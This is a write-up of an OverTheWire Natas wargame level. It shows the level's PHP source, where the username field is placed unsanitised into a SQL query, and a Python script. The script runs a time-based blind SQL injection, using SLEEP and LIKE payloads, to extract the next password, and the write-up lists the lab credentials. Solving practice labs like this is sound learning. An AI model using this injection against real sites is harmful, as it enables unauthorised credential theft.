# Natas 16 - Natas 17
    Username  : natas17
    Password  : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
    URL       : http://natas17.natas.labs.overthewire.org
# Solution
In the source code of natas 17 we can find that 
```
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```
Another SQL Injection and this one does not return anything !
We will use the same technique used with the previous SQLi Blind however, 
this time we will use time as an indicator of true/false.

We can automate this using a python script :
```
import requests
import re
import string

username = 'natas17'
password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'

url = f"http://{username}.natas.labs.overthewire.org/"

letters = string.ascii_letters + string.digits
nataspass = ''

while len(nataspass) < 32:
        for char in letters:
                print(f"Attempting password: {nataspass}{char}")
                response = requests.post(url, auth = (username, password), data = {"username" : 'natas18" AND BINARY password LIKE "' + nataspass + char + '%" AND SLEEP(10) #'})
                #print(response.elapsed.total_seconds())
                if response.elapsed.total_seconds() > 10:
                        nataspass += char
                        print(nataspass)
                        break
```
Since we know that the length of the password is 32 we are using that in the loop . This script may take a while to finish but the password will be printed as the output

# Password
    6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
